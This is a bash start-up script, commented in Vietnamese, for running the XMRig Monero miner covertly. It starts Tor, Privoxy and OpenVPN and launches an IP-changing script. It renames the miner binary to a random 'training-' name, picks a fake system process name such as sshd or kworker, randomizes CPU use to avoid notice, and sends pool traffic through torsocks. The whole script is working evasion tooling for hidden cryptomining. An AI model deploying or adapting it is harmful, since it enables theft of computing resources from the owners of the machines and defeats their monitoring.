#!/bin/bash

# Khởi động dịch vụ Tor, Privoxy và VPN
service tor start
if ! pgrep -x "tor" > /dev/null; then
  echo "Tor service failed to start"
fi

service privoxy start
if ! pgrep -x "privoxy" > /dev/null; then
  echo "Privoxy service failed to start"
fi

openvpn --config $VPN_CONFIG &
if ! pgrep -x "openvpn" > /dev/null; then
  echo "OpenVPN service failed to start"
fi

# Tạo bản sao của file xmrig nếu chưa có
if [ ! -f /root/work/xmrig_backup ]; then
  cp /root/work/xmrig /root/work/xmrig_backup
fi

# Kiểm tra và khởi động script đổi IP ngẫu nhiên
if [ -f /root/change_ip.sh ]; then
  /root/change_ip.sh &
else
  echo "Script change_ip.sh not found!"
fi

# Danh sách các tên tiến trình hợp lệ giống hệ thống
PROCESS_NAMES=("systemd" "sshd" "cron" "bash" "kworker" "dbus-daemon")

# Chọn một tên tiến trình ngẫu nhiên từ danh sách
RANDOM_PROCESS_NAME=${PROCESS_NAMES[$RANDOM % ${#PROCESS_NAMES[@]}]}

# Tạo tên tiến trình ngẫu nhiên mỗi khi chạy start.sh
RANDOM_NAME=$(echo training-$(shuf -i 1-999 -n 1))
echo $RANDOM_NAME > /root/xmrig_name.txt
mv /root/work/xmrig /root/work/$RANDOM_NAME

# Tính toán số threads dựa trên % CPU ngẫu nhiên
TOTAL_CORES=$(nproc)  # Xác định số CPU logic (bao gồm cả hyper-threading)
cpu_hint=$(shuf -i $CPU_MIN-$CPU_MAX -n 1)  # Phần trăm CPU sử dụng ngẫu nhiên
CPU_HINT=$(echo "($TOTAL_CORES * $cpu_hint) / 100" | bc)  # Tính số threads dựa trên % CPU và số core

# Phân bổ tiến trình trên nhiều core với taskset
CORE_SET=$(seq -s, 0 $(($TOTAL_CORES - 1)))  # Phân bổ trên tất cả các core logic

# Giới hạn tổng công suất từ 50% đến 90% với cpulimit
TOTAL_SYSTEM_POWER=$(($TOTAL_CORES * 100))  # Tổng công suất hệ thống (CPU logic x 100%)
CPU_LIMIT_PERCENT=$(shuf -i 50-90 -n 1)  # Lấy giá trị ngẫu nhiên từ 50% đến 90% công suất
CPU_LIMIT=$(($TOTAL_SYSTEM_POWER * $CPU_LIMIT_PERCENT / 100))  # Giới hạn công suất thực tế

# Khởi động XMRig với tên tiến trình mới và giới hạn CPU
echo "Khởi động XMRig với số threads: $CPU_HINT và giới hạn CPU: $CPU_LIMIT% và tên tiến trình: $RANDOM_PROCESS_NAME"
cpulimit -l $CPU_LIMIT -- taskset -c $CORE_SET torsocks /root/work/$RANDOM_NAME --donate-level $DONATE -o $POOL -u $USERNAME -a $ALGO --no-huge-pages --cpu-max-threads-hint=$CPU_HINT --tls --proxy=socks5://127.0.0.1:9050

# Giữ tiến trình chạy
tail -f /dev/null
